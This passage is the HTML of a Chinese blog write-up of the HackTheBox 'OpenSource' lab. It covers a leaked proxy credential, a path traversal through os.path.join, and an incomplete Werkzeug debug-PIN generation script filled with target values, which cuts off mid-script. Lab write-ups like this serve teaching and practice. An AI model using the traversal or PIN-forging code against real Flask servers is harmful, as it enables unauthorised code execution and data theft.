@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox-OpenSource - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="HackTheBox-OpenSource" />
+<meta property="og:description" content="HackTheBox靶机OpenSource" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mi3aka.eu.org/htb-opensource/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-28T14:08:30+00:00" />
+<meta property="article:modified_time" content="2022-08-28T14:08:30+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>
+
+<meta name="twitter:title" content="HackTheBox-OpenSource"/>
+<meta name="twitter:description" content="HackTheBox靶机OpenSource"/>
+<meta name="application-name" content="Mi3aka&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/htb-opensource/" /><link rel="prev" href="https://mi3aka.eu.org/viper%E5%88%9D%E4%BD%93%E9%AA%8C/" /><link rel="next" href="https://mi3aka.eu.org/htb-support/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox-OpenSource",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mi3aka.eu.org\/htb-opensource\/"
+        },"genre": "posts","wordcount":  1364 ,
+        "url": "https:\/\/mi3aka.eu.org\/htb-opensource\/","datePublished": "2022-08-28T14:08:30+00:00","dateModified": "2022-08-28T14:08:30+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Mi3aka"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox-OpenSource</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-08-28">2022-08-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1364 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前期工作">前期工作</a></li>
+    <li><a href="#破解pin码获取user权限">破解pin码,获取user权限</a></li>
+    <li><a href="#获取root权限">获取root权限</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="前期工作">前期工作</h2>
+<p>nmap 扫描结果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/b36baa0648caea64799f384ea0d0fcf6.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/b36baa0648caea64799f384ea0d0fcf6.png, https://img.mi3aka.eu.org/2022/08/b36baa0648caea64799f384ea0d0fcf6.png 1.5x, https://img.mi3aka.eu.org/2022/08/b36baa0648caea64799f384ea0d0fcf6.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/b36baa0648caea64799f384ea0d0fcf6.png"
+        title="https://img.mi3aka.eu.org/2022/08/b36baa0648caea64799f384ea0d0fcf6.png" /></p>
+<p>在<code>download</code>处可以下载到源代码,发现其存在<code>.git</code>文件夹</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/5ea81d832712f5e20a0b191884eafe9c.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/5ea81d832712f5e20a0b191884eafe9c.png, https://img.mi3aka.eu.org/2022/08/5ea81d832712f5e20a0b191884eafe9c.png 1.5x, https://img.mi3aka.eu.org/2022/08/5ea81d832712f5e20a0b191884eafe9c.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/5ea81d832712f5e20a0b191884eafe9c.png"
+        title="https://img.mi3aka.eu.org/2022/08/5ea81d832712f5e20a0b191884eafe9c.png" /></p>
+<p>存在两个分支<code>dev</code>和<code>public</code></p>
+<p>通过比较分支,发现<code>app/.vscode/setting.json</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;python.pythonPath&#34;</span><span class="p">:</span> <span class="s2">&#34;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;http.proxy&#34;</span><span class="p">:</span> <span class="s2">&#34;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;http.proxyStrictSSL&#34;</span><span class="p">:</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>分析源代码<code>view.py</code>和<code>utils.py</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">app.utils</span> <span class="kn">import</span> <span class="n">get_file_name</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">send_file</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">app</span> <span class="kn">import</span> <span class="n">app</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file_name</span> <span class="o">=</span> <span class="n">get_file_name</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s2">&#34;public&#34;</span><span class="p">,</span> <span class="s2">&#34;uploads&#34;</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;success.html&#39;</span><span class="p">,</span> <span class="n">file_url</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span> <span class="o">+</span> <span class="s2">&#34;uploads/&#34;</span> <span class="o">+</span> <span class="n">file_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;upload.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/uploads/&lt;path:path&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_report</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">get_file_name</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s2">&#34;public&#34;</span><span class="p">,</span> <span class="s2">&#34;uploads&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">current_milli_time</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Pass filename and return a secure version, which can then safely be stored on a regular file system.
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_file_name</span><span class="p">(</span><span class="n">unsafe_filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">recursive_replace</span><span class="p">(</span><span class="n">unsafe_filename</span><span class="p">,</span> <span class="s2">&#34;../&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">TODO: get unique filename
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_unique_upload_name</span><span class="p">(</span><span class="n">unsafe_filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">spl</span> <span class="o">=</span> <span class="n">unsafe_filename</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">.&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_name</span> <span class="o">=</span> <span class="n">spl</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_extension</span> <span class="o">=</span> <span class="n">spl</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">recursive_replace</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="s2">&#34;../&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;_&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">current_milli_time</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;.&#34;</span> <span class="o">+</span> <span class="n">file_extension</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Recursively replace a pattern in a string
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recursive_replace</span><span class="p">(</span><span class="n">search</span><span class="p">,</span> <span class="n">replace_me</span><span class="p">,</span> <span class="n">with_me</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">replace_me</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">search</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">search</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">recursive_replace</span><span class="p">(</span><span class="n">search</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">replace_me</span><span class="p">,</span> <span class="n">with_me</span><span class="p">),</span> <span class="n">replace_me</span><span class="p">,</span> <span class="n">with_me</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>send_report</code>函数中,虽然对<code>../</code>进行了过滤,但是由于<code>os.path.join</code>的存在,可以进行目录遍历和任意文件读取</p>
+<p>当<code>os.path.join</code>调用遇到绝对路径时,它会忽略在该点之前遇到的所有参数并开始使用新的绝对路径,当参数可控时,我们控制恶意参数输入绝对路径,可能产生目录遍历</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/11601daae01c3f08391f0736a60ea38c.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/11601daae01c3f08391f0736a60ea38c.png, https://img.mi3aka.eu.org/2022/08/11601daae01c3f08391f0736a60ea38c.png 1.5x, https://img.mi3aka.eu.org/2022/08/11601daae01c3f08391f0736a60ea38c.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/11601daae01c3f08391f0736a60ea38c.png"
+        title="https://img.mi3aka.eu.org/2022/08/11601daae01c3f08391f0736a60ea38c.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/285168606408c0e9830c619b1aaa5dec.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/285168606408c0e9830c619b1aaa5dec.png, https://img.mi3aka.eu.org/2022/08/285168606408c0e9830c619b1aaa5dec.png 1.5x, https://img.mi3aka.eu.org/2022/08/285168606408c0e9830c619b1aaa5dec.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/285168606408c0e9830c619b1aaa5dec.png"
+        title="https://img.mi3aka.eu.org/2022/08/285168606408c0e9830c619b1aaa5dec.png" /></p>
+<p>发现其开启了flask的debug模式,利用任意文件读取可以对flask的pin码进行破解</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/ea18124a6ac4a403efc58be408cf2da4.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/ea18124a6ac4a403efc58be408cf2da4.png, https://img.mi3aka.eu.org/2022/08/ea18124a6ac4a403efc58be408cf2da4.png 1.5x, https://img.mi3aka.eu.org/2022/08/ea18124a6ac4a403efc58be408cf2da4.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/ea18124a6ac4a403efc58be408cf2da4.png"
+        title="https://img.mi3aka.eu.org/2022/08/ea18124a6ac4a403efc58be408cf2da4.png" /></p>
+<h2 id="破解pin码获取user权限">破解pin码,获取user权限</h2>
+<p>Flask pin码破解</p>
+<p><a href="https://raw.githubusercontent.com/wdahlenburg/werkzeug-debug-console-bypass/main/werkzeug-pin-bypass.py" target="_blank" rel="noopener noreffer ">https://raw.githubusercontent.com/wdahlenburg/werkzeug-debug-console-bypass/main/werkzeug-pin-bypass.py</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">	<span class="s1">&#39;root&#39;</span><span class="p">,</span><span class="c1"># username</span>
+</span></span><span class="line"><span class="cl">	<span class="s1">&#39;flask.app&#39;</span><span class="p">,</span><span class="c1"># modname</span>
+</span></span><span class="line"><span class="cl">	<span class="s1">&#39;Flask&#39;</span><span class="p">,</span><span class="c1"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
+</span></span><span class="line"><span class="cl">	<span class="s1">&#39;/usr/local/lib/python3.10/site-packages/flask/app.py&#39;</span> <span class="c1"># getattr(mod, &#39;__file__&#39;, None),</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">	<span class="s1">&#39;2485377892354&#39;</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address /sys/class/net/eth0/address 将16进制转换成10进制</span>
+</span></span><span class="line"><span class="cl">	<span class="c1"># Machine Id: /etc/machine-id(部分linux系统可能没有,直接忽略即可) + /proc/sys/kernel/random/boot_id + /proc/self/cgroup</span>
+</span></span><span class="line"><span class="cl">	<span class="s1">&#39;1222106c-51fc-4deb-bc76-3a0e8123ecd75e5fb2cb3c55faf7ef369518259de66b251fa02647e1dca9db0b943d6f8c4235&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span> <span class="c1"># Newer versions of Werkzeug use SHA1 instead of MD5</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="k">continue</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
